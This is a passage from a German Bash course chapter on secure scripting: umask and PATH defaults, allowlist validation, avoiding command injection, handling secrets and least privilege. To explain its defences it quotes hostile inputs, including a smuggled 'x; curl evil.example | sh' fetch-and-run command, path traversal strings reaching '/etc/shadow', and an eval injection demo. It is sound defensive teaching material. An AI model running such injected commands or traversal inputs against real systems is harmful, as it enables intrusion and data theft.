# Modul 08 - Security, Hardening und sichere Skriptpraxis

> **Hinweis zu diesem Kapitel:** Das ist das Kapitel des Skripts „Bash – Vom Einstieg bis zur Automation“, aus der LaTeX-Quelle in Markdown umgewandelt (Text und Listings unverändert, farbige Boxen als Zitatblöcke mit fettem Titel, Tabellen als Markdown-Tabellen, Übungsaufgaben und Lösungen als Absätze). Die Überschriften sind wie in der Quelle nach Modul und Lerneinheit nummeriert (8.1 bis 8.9; 8.10 Übungsaufgaben, 8.11 Lösungen). **Die Beispiele wurden für dieses Repository nicht ausgeführt**, nur auf Bash-Syntax geprüft (`bash -n`, GNU bash 5.2); laut Einleitung hat der Autor sie ausgeführt, soweit sie ohne Spezialumgebung laufen. Viele Beispiele legen Dateien an, löschen oder verändern Systemzustand: nur in einem Testverzeichnis oder einer Testumgebung ausprobieren. Übersicht zum Modul: [README](README.md).

**Modulübersicht**

**Dauer:** 10 h laut Blatt „Lehrplan in Modulen“, 9 h laut Summe der Einzeleinheiten im Blatt „Lehrplan in Details“ (9 Einheiten à 1 h). Die beiden Angaben weichen um eine Stunde ab; als Maßstab für den Umfang dient der höhere Wert (10 h).  
**Priorität:** 1 (höchste)

| Nr. | Lerneinheit                 | Dauer (h) | Prio |
|:----|:----------------------------|----------:|:----:|
| 8.1 | Sichere Defaults            |         1 |  1   |
| 8.2 | Input Validation Security   |         1 |  1   |
| 8.3 | Command Injection vermeiden |         1 |  1   |
| 8.4 | Secrets Handling            |         1 |  1   |
| 8.5 | Least Privilege             |         1 |  1   |
| 8.6 | Sichere Downloads           |         1 |  1   |
| 8.7 | Dateirechte und Ownership   |         1 |  2   |
| 8.8 | Auditierbarkeit             |         1 |  2   |
| 8.9 | Datenschutz                 |         1 |  2   |
|     | **Summe (Details)**         |     **9** |      |

Ein Shell-Skript ist ein Werkzeug mit weitreichender Macht: Es startet Programme, liest und löscht Dateien, spricht mit dem Netz und läuft nicht selten mit den Rechten eines Administrators. Genau deshalb ist es ein attraktives Angriffsziel und ein häufiger Ort für teure Fehler. Dieses Modul behandelt die Sicherheit von Skripten aus drei Blickwinkeln: Schutz vor *Missbrauch* (Eingaben, die das Skript zu etwas anderem bringen, als es sollte), Schutz vor *Datenverlust* (versehentliche oder böswillige Zerstörung) und Schutz vor *Geheimnislecks* (Passwörter, Tokens, personenbezogene Daten). Vieles baut auf den Modulen 3, 4 und 6 auf; wo es Überschneidungen gibt, wird verwiesen. Alle Beispiele sind harmlos und laufen in einem Testverzeichnis. *Sicherheit ist keine Eigenschaft, die man am Ende hinzufügt*, sondern eine Haltung beim Schreiben jeder Zeile.

## 8.1 Sichere Defaults

Ein sicherer Default ist ein Verhalten, das ohne zusätzliche Entscheidung auf der sicheren Seite liegt. Wenn man etwas vergisst, soll das Skript im Zweifel *zu streng* sein, nicht zu offen. Die Fachwelt nennt das *Fail-safe*: Tritt ein Fehler oder ein unerwarteter Zustand ein, endet das Skript in einem sicheren Zustand (Abbruch, nichts löschen, nichts öffnen) statt in einem gefährlichen (weitermachen, trotzdem löschen, Rechte großzügig vergeben).

Drei Bausteine sind besonders wichtig. Erstens die *umask*: Sie legt fest, welche Rechte *neu angelegte* Dateien *nicht* bekommen. Eine umask von `022` (üblicher Standard) lässt neue Dateien als `644` entstehen, also für alle lesbar. Für ein Skript, das Geheimnisse oder interne Daten erzeugt, setzt man `umask 077`: Neue Dateien erhalten `600`, Verzeichnisse `700`, nur der Eigentümer hat Zugriff. Wichtig: Die umask gilt für den Prozess und alle Kindprozesse, aber sie wirkt nur beim *Anlegen*; schon bestehende Dateien ändert sie nicht. Zweitens die Strict-Mode-Optionen aus Modul 6.1 (`set -euo pipefail`), die verhindern, dass das Skript mit leeren Variablen oder nach Fehlern weiterläuft: Ein `rm -rf "$verz/"` mit nicht gesetzter Variable wird so zu einem Fehler statt zum Löschen des Wurzelverzeichnisses. Drittens ein *kontrollierter PATH*: Wer Befehle ohne absoluten Pfad aufruft, verlässt sich darauf, dass `PATH` nur vertrauenswürdige Verzeichnisse enthält. Enthält er ein beschreibbares oder gar das aktuelle Verzeichnis (`.` oder ein leeres Element), kann ein Angreifer ein Programm namens `ls` unterschieben. Privilegierte Skripte setzen `PATH` deshalb am Anfang selbst.

Zu den sicheren Defaults gehört außerdem, *Standardwerte restriktiv zu wählen*: Ein Skript, das Dateien freigibt, tut es nur, wenn die Option ausdrücklich gesetzt ist; ein Löschskript arbeitet standardmäßig im Trockenlauf und löscht nur mit `--force`; fehlt eine Konfiguration, bricht es ab, statt unsichere Annahmen zu treffen. Auch das Verhalten im Fehlerfall zählt: Wenn die Prüfung einer Berechtigung nicht durchgeführt werden kann (Server nicht erreichbar), ist die richtige Antwort „nicht erlaubt“, nicht „dann eben erlaubt“.

```bash
#!/usr/bin/env bash
# defaults-demo.sh - sichere Grundeinstellungen am Skriptanfang
set -euo pipefail
IFS=$'\n\t'                                  # kein Splitting an Leerzeichen
umask 077                                    # neue Dateien nur fuer den Eigentuemer
PATH="/usr/local/bin:/usr/bin:/bin"          # kontrollierter Suchpfad
export PATH

# --- 1. umask wirkt auf neu angelegte Objekte
arbeit="$(mktemp -d)"
trap 'rm -rf -- "$arbeit"' EXIT
touch "$arbeit/neu.txt"
mkdir "$arbeit/neuer-ordner"
stat -c '%a %n' "$arbeit/neu.txt" "$arbeit/neuer-ordner" | sed "s|$arbeit/||"

# --- 2. Vergleich: ohne umask-Haerte
( umask 022; touch "$arbeit/offen.txt" )
stat -c '%a %n' "$arbeit/offen.txt" | sed "s|$arbeit/||"

# --- 3. Loeschen: Standard ist Trockenlauf, echtes Loeschen nur mit --force
loesche() {
    local ziel="${1:?Zielverzeichnis fehlt}" modus="${2:-trocken}"
    [[ -d $ziel ]] || { echo "Kein Verzeichnis: $ziel" >&2; return 1; }
    case $ziel in
        /|/home|/etc|/usr|/var) echo "Verweigert: geschuetzter Pfad $ziel" >&2; return 1 ;;
    esac
    if [[ $modus == --force ]]; then
        rm -rf -- "${ziel:?}"/*
        echo "geloescht: Inhalt von $ziel"
    else
        echo "Trockenlauf, wuerde loeschen:"; ls -A -- "$ziel"
    fi
}

mkdir "$arbeit/cache"; touch "$arbeit/cache/a" "$arbeit/cache/b"
loesche "$arbeit/cache"                   # nur anzeigen
loesche "/etc" --force || true            # wird verweigert
loesche "$arbeit/cache" --force           # erst jetzt echt
ls -A "$arbeit/cache" | wc -l
```

Das Beispiel beginnt mit dem Block, der in jedes sicherheitsrelevante Skript gehört. `IFS=$'\n\t'` entfernt das Leerzeichen aus den Trennzeichen der Wortaufspaltung; so zerfallen ungequotete Variablen nicht mehr an Leerzeichen (kein Ersatz für korrektes Quoting, aber ein zusätzliches Sicherheitsnetz). `umask 077` macht alle neu angelegten Objekte privat, was die Ausgabe der `stat`-Zeilen bestätigt: `600` für die Datei, `700` für das Verzeichnis. Der Vergleich in der Subshell mit `umask 022` zeigt, dass dort `644` entsteht; die Änderung der umask bleibt auf die Subshell beschränkt. Die Funktion `loesche` setzt die Prinzipien um: Das Argument ist Pflicht (`${1:?...}`), der Modus ist standardmäßig ein Trockenlauf, ein paar kritische Pfade werden verweigert, und beim echten Löschen schützt `${ziel:?}` nochmals vor einer leeren Variable. Beachten Sie, dass die Funktion das Verzeichnis selbst stehen lässt und nur den *Inhalt* entfernt.

Typische Fehler: Erstens bleibt die umask beim Standard, und ein Skript legt Token-Dateien mit `644` an, die jeder auf dem System lesen kann. Zweitens setzt man die Rechte erst *nach* dem Schreiben (`echo geheim > datei; chmod 600 datei`): In der kurzen Lücke dazwischen ist die Datei lesbar; richtig ist, erst die umask zu setzen oder die Datei vorher mit `install -m 600 /dev/null datei` anzulegen. Drittens läuft das Skript unter dem geerbten `PATH`, etwa bei `sudo` oder Cron. Viertens ist das Löschen standardmäßig scharf und verlässt sich auf die Sorgfalt des Aufrufers. Fünftens: Fehlerfälle werden *zu offen* behandelt: `if ! pruefe_berechtigung; then ...` ist nicht dasselbe wie die Prüfung, ob die Berechtigung *positiv bestätigt* ist.

```bash
# falsch: Datei kurz fuer alle lesbar, Rechte erst nachtraeglich
echo "$TOKEN" > /tmp/token
chmod 600 /tmp/token

# richtig: erst die Rechte, dann der Inhalt (umask oder install)
( umask 077; printf '%s\n' "$TOKEN" > "$tokendatei" )
# oder: install -m 600 /dev/null "$tokendatei" && printf '%s\n' "$TOKEN" > "$tokendatei"
```

> **Merke**
>
> Sicher beginnen: `set -euo pipefail`, `umask 077`, eigener `PATH`. Standardverhalten restriktiv wählen (Trockenlauf, Abbruch bei fehlender Konfiguration, im Zweifel *nicht erlaubt*). Rechte vor dem Schreiben setzen, nicht danach.

> **Praxisbeispiel**
>
> Ein Backup-Skript legt Datenbank-Dumps in `/var/backups` ab. Weil es mit der Standard-umask lief, waren die Dumps für alle lokalen Benutzer lesbar. Ein einziges `umask 077` am Anfang schloss die Lücke; zusätzlich prüft ein Test im CI, dass keine neu angelegte Datei Gruppen- oder Weltrechte hat.

## 8.2 Input Validation Security

Alles, was von außen in ein Skript kommt, ist *nicht vertrauenswürdig*: Kommandozeilenargumente, Umgebungsvariablen, Dateiinhalte, Dateinamen, Ausgaben anderer Programme, Antworten von Netzwerkdiensten. *Eingabevalidierung* bedeutet, solche Werte zu prüfen, bevor man sie verwendet. Das zentrale Prinzip lautet: *Allowlist statt Blocklist*. Eine Blocklist verbietet bekannte schlechte Zeichen oder Muster und scheitert zuverlässig an dem einen Fall, den man nicht bedacht hat. Eine Allowlist beschreibt dagegen, was *erlaubt* ist (etwa „nur Buchstaben, Ziffern, Punkt, Unterstrich und Bindestrich, höchstens 64 Zeichen“), und weist alles andere zurück. Weniger Raum für Überraschungen, und die Prüfung ist einfach zu lesen.

In Bash prüft man mit `[[ ... =~ regex ]]` oder mit Mustern in `case`. Ein Muster wie `^[A-Za-z0-9._-]{1,64}$` ist eine typische Allowlist für Namen. Sie sollte *am Anfang und am Ende verankert* sein (`\^{}` und `$`); sonst genügt ein erlaubtes Teilstück irgendwo im Wert. Die Länge zu begrenzen verhindert extrem lange Werte. Zahlen prüft man mit `^[0-9]+$` und danach auf einen sinnvollen Bereich; die Zahl wird dabei *dezimal* ausgewertet (`10#$n`), sonst interpretiert die Arithmetik eine führende Null als Oktalzahl (`08` ist dort ein Fehler). Auswahlwerte wie „start“, „stop“ oder „status“ prüft man mit `case` gegen die erlaubten Wörter.

Besondere Sorgfalt verlangen *Pfade*. Ein Benutzer gibt einen Dateinamen an, und das Skript hängt ihn an ein Basisverzeichnis an. Mit `../` lässt sich aus diesem Verzeichnis ausbrechen (*Path Traversal*), und *Symlinks* können auf Ziele außerhalb zeigen. Robust ist es, den Pfad zu *kanonisieren* (`realpath -m`, löst `..` und Symlinks auf) und danach zu prüfen, dass das Ergebnis tatsächlich *unterhalb* des Basisverzeichnisses liegt. Auch Namen, die mit einem Bindestrich beginnen, sind gefährlich, denn Programme halten sie für Optionen (*Argument Injection*). Abhilfe: `--` vor dem Dateinamen setzen, oder den Namen mit `./` voranstellen. Schließlich sind Dateinamen selbst beliebige Bytefolgen und dürfen Leerzeichen, Zeilenumbrüche und Sonderzeichen enthalten; Prüfungen und Schleifen müssen das aushalten (Modul 2 und 5).

```bash
#!/usr/bin/env bash
# validiere-demo.sh - Eingaben per Allowlist pruefen
set -euo pipefail
basis="$(mktemp -d)"
trap 'rm -rf -- "$basis"' EXIT
mkdir -p "$basis/uploads" "$basis/geheim"
echo "oeffentlich" > "$basis/uploads/bericht.txt"
echo "streng geheim" > "$basis/geheim/passwort.txt"
ln -s "$basis/geheim/passwort.txt" "$basis/uploads/trick.txt"   # Symlink nach aussen

# --- Namens-Allowlist: nur [A-Za-z0-9._-], 1 bis 64 Zeichen, nicht mit '-' oder '.' beginnend
pruefe_name() {
    [[ $1 =~ ^[A-Za-z0-9_][A-Za-z0-9._-]{0,63}$ ]]
}

# --- Zahl pruefen, Bereich pruefen, dezimal auswerten
pruefe_port() {
    local p="$1"
    [[ $p =~ ^[0-9]{1,5}$ ]] || return 1
    (( 10#$p >= 1 && 10#$p <= 65535 ))
}

# --- Pfad kanonisieren und Basisverzeichnis erzwingen
sicherer_pfad() {                  # sicherer_pfad BASIS NAME -> gibt absoluten Pfad aus
    local basis_abs ziel
    basis_abs="$(realpath -- "$1")"
    pruefe_name "$2" || { echo "ungueltiger Name: $2" >&2; return 1; }
    ziel="$(realpath -m -- "$basis_abs/$2")"
    case $ziel in
        "$basis_abs"/*) printf '%s\n' "$ziel" ;;
        *) echo "ausserhalb von $basis_abs: $ziel" >&2; return 1 ;;
    esac
}

for name in bericht.txt ../geheim/passwort.txt -rf "a b" trick.txt; do
    if pfad="$(sicherer_pfad "$basis/uploads" "$name" 2>/dev/null)"; then
        echo "OK       '$name' -> ${pfad#"$basis"/}"
    else
        echo "ABGELEHNT '$name'"
    fi
done

for p in 8080 08 0 70000 "80;ls" ""; do
    if pruefe_port "$p"; then echo "Port '$p' ok"; else echo "Port '$p' abgelehnt"; fi
done
```

Die Funktion `pruefe_name` ist die Allowlist: Das erste Zeichen darf weder Bindestrich noch Punkt sein (damit weder Optionen noch versteckte Dateien oder `..` durchkommen), danach sind höchstens 63 weitere erlaubte Zeichen zulässig. Slash und Leerzeichen gehören nicht zur Liste, daher scheitern Pfadangaben wie `../geheim/passwort.txt`, `-rf` und `a b`. `pruefe_port` prüft zuerst das Format, dann den Wertebereich, wobei `10#$p` die Zahl `08` dezimal auswertet (ohne `10#` wäre `08` ein Arithmetikfehler). `sicherer_pfad` kombiniert beides: Es prüft den Namen, kanonisiert danach mit `realpath -m` und erzwingt, dass das Ergebnis unterhalb des Basisverzeichnisses liegt. Der Symlink `trick.txt` besteht die Namensprüfung, wird aber vom Kanonisieren entlarvt, weil sein Ziel im Verzeichnis `geheim` liegt. Das Beispiel zeigt auch: Man braucht oft *mehrere Schichten*, nicht nur eine.

Typische Fehler: Erstens eine Blocklist (`[[ $name == *..* ]]`), die Varianten wie `....//` oder URL-kodierte Eingaben übersieht. Zweitens nicht verankerte Muster, bei denen `[[ $x =~ [0-9]+ ]]` auch `12; rm` akzeptiert. Drittens wird nur auf Gutes geprüft, nicht auf Länge. Viertens Pfade, die man vor dem Kanonisieren prüft und danach nicht noch einmal. Fünftens ein Wert, der mit `-` beginnt, landet ohne `--` als Option bei einem Befehl. Sechstens wird die Prüfung zu früh durchgeführt und der Wert danach verändert (*Time of Check to Time of Use*, kurz TOCTOU); gerade bei Dateien kann sich zwischen Prüfung und Benutzung etwas ändern, weshalb man sicherheitskritische Operationen atomar gestaltet (siehe Modul 6.6).

```bash
# falsch: Blocklist, unverankert, Option kann eingeschleust werden
[[ $datei == *../* ]] && exit 1
cat $datei

# richtig: Allowlist, verankert, kanonisiert, mit --
[[ $datei =~ ^[A-Za-z0-9_][A-Za-z0-9._-]{0,63}$ ]] || exit 1
pfad="$(realpath -m -- "$basis/$datei")"
[[ $pfad == "$basis"/* ]] || exit 1
cat -- "$pfad"
```

> **Merke**
>
> Allowlist statt Blocklist, verankert und längenbegrenzt. Zahlen dezimal und im Bereich prüfen. Pfade kanonisieren (`realpath -m`) und das Basisverzeichnis erzwingen. Werte vor Befehlen mit `--` absichern. Prüfen heißt: ablehnen, nicht „reparieren“.

> **Praxisbeispiel**
>
> Ein internes Tool erlaubt Mitarbeitenden, Berichte aus einem Verzeichnis herunterzuladen. Ein Name wie `../../etc/shadow` wäre ohne Prüfung durchgegangen. Mit Namens-Allowlist, Kanonisierung und Basisverzeichnis-Prüfung ist der Ausbruch ausgeschlossen, und der Sicherheitstest im Repository fängt Rückfälle ab.

## 8.3 Command Injection vermeiden

Bei der *Command Injection* gelangt Text von außen als *Befehl* zur Ausführung, obwohl er nur als *Daten* gedacht war. Der Auslöser ist fast immer derselbe: Ein Skript baut eine Befehlszeile als *Zeichenkette* zusammen und lässt sie von der Shell auswerten. Die Shell kann Daten und Befehle aber nicht unterscheiden; Zeichen wie `;`, `|`, `&`, `$(...)`, Backticks, Zeilenumbrüche oder Anführungszeichen verändern die Bedeutung. Wer einen Benutzernamen in eine Zeichenkette einbaut und diese mit `eval` oder `bash -c` ausführt, gibt jedem, der den Namen steuert, die Gewalt über das Skript.

Der zuverlässigste Schutz ist *kein Schutz durch Maskieren, sondern Trennung von Daten und Befehl*: Die Argumente werden einzeln übergeben, nie als zusammengesetzter Text. Dafür gibt es in Bash klare Regeln. Erstens `eval` praktisch nie verwenden: Es wertet seinen Text als Shell-Code aus und kommt fast immer vermeidbar zum Einsatz (für indirekte Variablen gibt es `declare -n` und `${!name}`, für dynamische Befehle Arrays). Zweitens *Argumente als Array* aufbauen und mit `"${args[@]}"` übergeben: Jedes Element bleibt ein einziges Argument, egal welche Zeichen es enthält. Drittens Variablen *immer in Anführungszeichen* setzen. Viertens vor Werten, die aus Eingaben stammen, `--` verwenden, damit sie nicht als Optionen gelten. Fünftens kein `bash -c "...$eingabe..."`; wenn eine Subshell nötig ist, übergibt man die Daten als Positionsparameter: `bash -c 'befehl "$1"' _ "$eingabe"`. Sechstens beachten, dass viele Programme selbst Befehle ausführen: `find -exec`, `xargs`, `awk` mit `system()`, `ssh host befehl` (der Befehl wird auf der Gegenseite wieder von einer Shell ausgewertet), `sed` mit dem GNU-`e`-Befehl. Überall dort gilt dieselbe Vorsicht.

```bash
#!/usr/bin/env bash
# injection-demo.sh - gleiche Eingabe, unsicher und sicher behandelt
set -euo pipefail
arbeit="$(mktemp -d)"
trap 'rm -rf -- "$arbeit"' EXIT
cd "$arbeit"
echo "inhalt A" > "bericht.txt"

# boeswillige Eingabe: sieht aus wie ein Dateiname, enthaelt aber einen Befehl
eingabe='bericht.txt; echo "!!! INJIZIERTER BEFEHL LAEUFT !!!"'

echo "--- UNSICHER: Befehl als Zeichenkette zusammengebaut und mit eval ausgefuehrt"
befehl="cat $eingabe"
eval "$befehl"

echo "--- SICHER 1: Argument einzeln uebergeben, Wert bleibt Daten"
cat -- "$eingabe" 2>&1 || echo "(Datei nicht gefunden - kein Befehl ausgefuehrt)"

echo "--- SICHER 2: Argumente als Array bauen"
optionen=(-n)                                   # -n: Zeilennummern
if [[ ${VERBOSE:-0} == 1 ]]; then optionen+=(-A); fi
cat "${optionen[@]}" -- "bericht.txt"

echo "--- SICHER 3: Subshell nur mit Positionsparameter"
bash -c 'printf "Datei: %s\n" "$1"; wc -c -- "$1" 2>&1 | cut -d" " -f1' _ "bericht.txt"

echo "--- UNSICHER bei Dateinamen, die wie Optionen aussehen"
: > ./-n
echo "ohne -- :" ; rm -f -n 2>&1 | head -1 || true       # -n wird als Option gelesen
echo "mit -- oder ./ :"; rm -f -- ./-n; ls -A
```

Die Eingabe imitiert einen Angriff: Sie enthält nach dem Dateinamen ein Semikolon und einen weiteren Befehl. Im ersten, unsicheren Abschnitt baut das Skript eine Zeichenkette, die `eval` als Shell-Code auswertet; das Semikolon trennt dann zwei Befehle, und der „fremde“ Befehl läuft. Im zweiten Abschnitt wird derselbe Wert als *ein einziges Argument* an `cat` übergeben; die Shell wertet den Inhalt nicht aus, es gibt lediglich keine Datei mit diesem seltsamen Namen. Der dritte Abschnitt zeigt das Muster, das man für variable Optionen verwenden sollte: ein Array, dem man bedingt Elemente hinzufügt; jedes Element ist garantiert ein einzelnes Argument. Der vierte Abschnitt übergibt Daten an eine Subshell *nicht* als Teil des Befehlstexts, sondern als `$1`, wobei das Unterstrich-Argument den Platz von `$0` füllt. Der letzte Abschnitt demonstriert Argument Injection über Dateinamen: Eine Datei namens `-n` wird ohne Schutz als Option gelesen.

Typische Fehler: Erstens `eval` mit Eingabewerten, auch „nur ein bisschen“. Zweitens Befehle in Variablen: `cmd="grep -r $muster dir"; $cmd` zerfällt an Leerzeichen, Anführungszeichen im Wert werden nicht ausgewertet, und der Ersteller glaubt, es sei sicher. Drittens verlässt man sich auf Maskierung wie `printf %q`; das hilft bei einer zweiten Auswertung, ist aber eine Notlösung und fehleranfällig. Viertens ein Pfad, der aus einer Eingabe stammt, wird in einen `ssh`-Befehl eingebaut. Fünftens vertraut man Daten aus „internen“ Quellen: Auch Dateinamen aus einem Upload-Verzeichnis, Hostnamen aus einem Inventar und Zeilen aus einer Logdatei können Angriffsdaten tragen. Sechstens gilt es zu bedenken, dass Dateinamen in `find ... -exec` sicher sind, solange man `{}` direkt als Argument übergibt, nicht innerhalb von `sh -c "...{}..."`.

```bash
# falsch: Zeichenkette + eval; Eingabe wird zu Code
eval "ls -l $verzeichnis"
cmd="grep -r $muster $ziel"; $cmd

# richtig: Argumente einzeln, Optionen als Array, -- vor Eingabewerten
args=(-r)
[[ $ignorecase == 1 ]] && args+=(-i)
grep "${args[@]}" -- "$muster" "$ziel"
```

> **Merke**
>
> Daten und Befehl strikt trennen: Argumente einzeln übergeben, Optionen als Array, Variablen quoten, `--` vor Eingaben. `eval` und `bash -c "...$x..."` vermeiden. Auch Dateinamen, Hostnamen und Logzeilen sind Eingaben.

> **Ergänzung aus der Nachrecherche**
>
> **Ergänzung aus der Nachrecherche:** Die OWASP-Empfehlungen zur Abwehr von OS Command Injection (abgerufen, siehe Quellenverzeichnis) stimmen mit diesem Vorgehen überein: Wo möglich keine Betriebssystembefehle aufrufen, sondern Bibliotheksfunktionen verwenden; wo es nicht anders geht, Parameter strukturiert statt als zusammengesetzte Zeichenkette übergeben; Befehle und Argumente gegen eine Allowlist prüfen; Argument Injection durch `--` (wo vom Programm unterstützt) abfangen; und die Anwendung mit minimalen Rechten betreiben. Das bloße Maskieren von Sonderzeichen wird dort ausdrücklich als die schwächere Variante bezeichnet.

> **Praxisbeispiel**
>
> Ein Self-Service-Skript legt auf Zuruf neue Projektordner an. Ein Aufrufer gab als Projektnamen `x; curl evil.example | sh` an. Weil das Skript den Namen einzeln als Argument an `mkdir` übergibt und vorher per Allowlist prüft, wird die Eingabe abgelehnt; die ursprüngliche Version mit `eval` hätte den Befehl ausgeführt.

## 8.4 Secrets Handling

Als *Secret* gilt alles, dessen Bekanntwerden Schaden anrichtet: Passwörter, API-Tokens, private Schlüssel, Zugangsdaten für Datenbanken, Signierschlüssel. Skripte brauchen sie ständig, und die Fehler sind immer ähnlich: Das Geheimnis steht im Quelltext (und damit in der Versionsverwaltung), in der Befehlszeile (sichtbar in der Prozessliste), im Log, in der Shell-History oder in einer Datei mit zu offenen Rechten. Ein einmal veröffentlichtes Geheimnis lässt sich nicht zurückholen; dann hilft nur das *Widerrufen und Neuausstellen* (Rotation).

Die Übergabe eines Secrets hat mehrere Wege, jeder mit eigenen Schwächen. Als *Argument* (`--password=geheim`) ist es für alle lokalen Benutzer mit `ps` oder `/proc/<pid>/cmdline` sichtbar; das ist der schlechteste Weg. Als *Umgebungsvariable* ist es besser, aber nicht perfekt: Kindprozesse erben die Variable, sie steht in `/proc/<pid>/environ` (nur für den Eigentümer und root lesbar), Diagnosewerkzeuge und Absturzberichte können sie ausgeben, und `set -x` (Modul 6.4) druckt sie ins Log. Als *Datei* mit Rechten `600` (am besten außerhalb des Repositorys, im Home oder unter `/etc`) ist es gut kontrollierbar; das Skript erhält nur den Dateipfad. Über *Standardeingabe* (`read -rs` oder eine Pipe) taucht es nirgends in Listen auf. Am besten sind *Secret Stores*: ein Passwortmanager, ein Vault-Dienst, der Secret-Mechanismus der CI-Plattform oder des Cloud-Anbieters. Das Skript holt das Geheimnis zur Laufzeit mit einer kurzlebigen Berechtigung ab, statt es dauerhaft zu besitzen.

Dazu kommen Maßnahmen im Skript selbst. *Nie loggen*: weder das Geheimnis noch Befehlszeilen oder Umgebungen, die es enthalten; vor `set -x` und vor Debugging-Ausgaben sorgfältig abwägen. *Nie hart codieren*, auch nicht als „nur zum Testen“. *Kurz halten*: das Secret möglichst nur in dem Befehl bereitstellen, der es braucht (`VAR=wert befehl` setzt die Variable nur für diesen einen Prozess). *Vor Versionsverwaltung schützen*: `.gitignore` für Konfigurationsdateien, Secret-Scanner (zum Beispiel als Pre-Commit-Hook oder in der CI) für versehentliche Funde. Und *Rotation* einplanen: Jedes Secret hat ein Ablaufdatum, und das Skript muss mit einem Wechsel zurechtkommen.

```bash
#!/usr/bin/env bash
# secrets-demo.sh - Geheimnisse sicher uebergeben und nicht verraten
set -euo pipefail
umask 077
arbeit="$(mktemp -d)"
trap 'rm -rf -- "$arbeit"' EXIT

# --- Das Geheimnis kommt aus einer Datei mit Rechten 600 (hier: simuliert)
geheimdatei="$arbeit/api-token"
printf '%s\n' "s3cr3t-T0KEN-12345" > "$geheimdatei"
stat -c 'Rechte der Geheimdatei: %a' "$geheimdatei"

lade_secret() {                       # lade_secret DATEI -> gibt Inhalt aus
    local datei="$1" rechte
    [[ -f $datei ]] || { echo "Secret-Datei fehlt" >&2; return 1; }
    rechte="$(stat -c '%a' "$datei")"
    [[ $rechte == 600 || $rechte == 400 ]] || {
        echo "Secret-Datei hat unsichere Rechte ($rechte), Abbruch" >&2; return 1; }
    cat -- "$datei"
}

# --- Variante A: Token nur fuer EINEN Befehl in die Umgebung legen
token="$(lade_secret "$geheimdatei")"
TOKEN="$token" bash -c 'echo "Unterbefehl sieht Token der Laenge ${#TOKEN}"'
echo "Hauptshell hat TOKEN exportiert? ${TOKEN:-nein}"

# --- Variante B: Token ueber stdin statt ueber die Befehlszeile
printf '%s' "$token" | wc -c | sed 's/^/uebergeben ueber stdin, Bytes: /'

# --- Logging: Geheimnisse maskieren
maskiere() { sed -E 's/(token|password|secret|passwort)=[^& ]+/\1=***/Ig'; }
echo "GET /api?user=anna&token=$token&format=json" | maskiere

# --- set -x ohne Leck: Ausgabe voruebergehend abschalten
set -x
{ set +x; } 2>/dev/null               # Trace aus, bevor das Geheimnis benutzt wird
curl_befehl_simuliert() { echo "Authorization: Bearer ${#1} Zeichen" ; }
curl_befehl_simuliert "$token"
set -x; { set +x; } 2>/dev/null

# --- Unsichere Rechte werden erkannt
chmod 644 "$geheimdatei"
lade_secret "$geheimdatei" || echo "(erwartete Ablehnung)"
```

Das Skript hält sich an die Regeln: Die Geheimdatei hat `600`, und die Ladefunktion prüft das nach, bevor sie den Inhalt liest; bei offeneren Rechten bricht sie ab, was im letzten Block gezeigt wird. In Variante A steht das Token nur in der Umgebung *dieses einen Prozesses*; die Hauptshell kennt keine exportierte Variable `TOKEN`, die Kontrolle am Ende bestätigt das. Variante B übergibt es über eine Pipe, wo es weder in der Prozessliste noch in der Umgebung steht. Die Funktion `maskiere` ersetzt in Logzeilen die Werte bekannter Schlüsselwörter durch Sternchen, ein Notnagel für Ausgaben fremder Programme, aber kein Ersatz dafür, das Geheimnis gar nicht erst zu loggen. Der Trace-Abschnitt zeigt eine bekannte Falle: Mit `set -x` landet jeder Befehl samt Variablenwerten im Log; deshalb schaltet man den Trace vor der Verwendung des Geheimnisses ab. Die Konstruktion `{ set +x; } 2>/dev/null` verhindert, dass der Befehl `set +x` selbst im Trace erscheint.

Typische Fehler: Erstens stehen Passwörter im Skript oder in einer ins Repository eingecheckten Konfigurationsdatei. Zweitens werden sie als Befehlszeilenargument übergeben (`mysql -pGEHEIM`; die meisten Programme bieten eine Alternative wie eine Optionsdatei oder Umgebungsvariable). Drittens werden Secrets in Logs und Fehlermeldungen geschrieben, etwa durch `set -x` oder `curl -v`. Viertens bleibt die Variable exportiert und wird an alle Kindprozesse weitergegeben. Fünftens sind Dateirechte zu offen (`644`) oder das Secret liegt in einem temporären Verzeichnis, das für alle lesbar ist. Sechstens gibt es keine Rotation: Das Secret ist seit Jahren dasselbe und im Kopf jedes ehemaligen Mitarbeitenden. Siebtens wird ein versehentlich eingechecktes Geheimnis einfach durch einen neuen Commit „entfernt“; es bleibt in der Historie, also muss es widerrufen werden.

```bash
# falsch: Geheimnis im Skript, in der Befehlszeile und im Trace
DB_PASS="hunter2"
set -x
mysql -u app -p"$DB_PASS" -e 'SELECT 1'

# richtig: aus Datei mit Rechten 600 lesen, nur im Befehl bereitstellen
MYSQL_PWD="$(< "$HOME/.config/app/dbpass")" mysql -u app -e 'SELECT 1'
```

> **Merke**
>
> Secrets nie im Code, nie im Repository, nie im Log, nie als Befehlszeilenargument. Besser: Datei mit `600`, Standardeingabe oder Secret Store; als Umgebungsvariable nur für den einen Befehl. `set -x` gefährdet Secrets. Ein veröffentlichtes Geheimnis muss rotiert werden.

> **Praxisbeispiel**
>
> Eine CI-Pipeline deployt mit einem Cloud-Token. Das Token liegt im Secret-Speicher der CI-Plattform, wird dem Deploy-Schritt als maskierte Umgebungsvariable gegeben und läuft nach einer Stunde ab. Ein Secret-Scanner im Pre-Commit-Hook verhindert, dass jemand es versehentlich einchecken kann.

## 8.5 Least Privilege

Das *Prinzip der minimalen Rechte* (Least Privilege) besagt: Ein Programm, ein Benutzer oder ein Dienst bekommt genau die Rechte, die er für seine Aufgabe braucht, und nicht mehr. Der Schaden, den ein Fehler oder ein Angriff anrichten kann, ist durch die Rechte des betroffenen Prozesses begrenzt. Läuft ein Skript als `root`, kann ein einziger Tippfehler das System zerstören; läuft es als eigener, unprivilegierter Benutzer, ist der Schaden auf dessen Dateien beschränkt.

Für Skripte folgt daraus: *Als normaler Benutzer ausführen*, wann immer es geht. Wenn nur ein einzelner Schritt Root-Rechte braucht (einen Dienst neu starten, ein Systemverzeichnis beschreiben), erhöht man die Rechte *nur für diesen Befehl* mit `sudo befehl`, statt das ganze Skript mit `sudo skript` zu starten. Ein Skript kann zu Beginn prüfen, ob es versehentlich als Root läuft (`(( EUID == 0 ))`), und in diesem Fall abbrechen oder zumindest warnen; umgekehrt kann ein Skript, das zwingend Root braucht, das früh feststellen. Für dauerhaft laufende Aufgaben legt man *dedizierte Dienstkonten* an (ohne Login-Shell, ohne Passwort, mit einem einzigen Zweck).

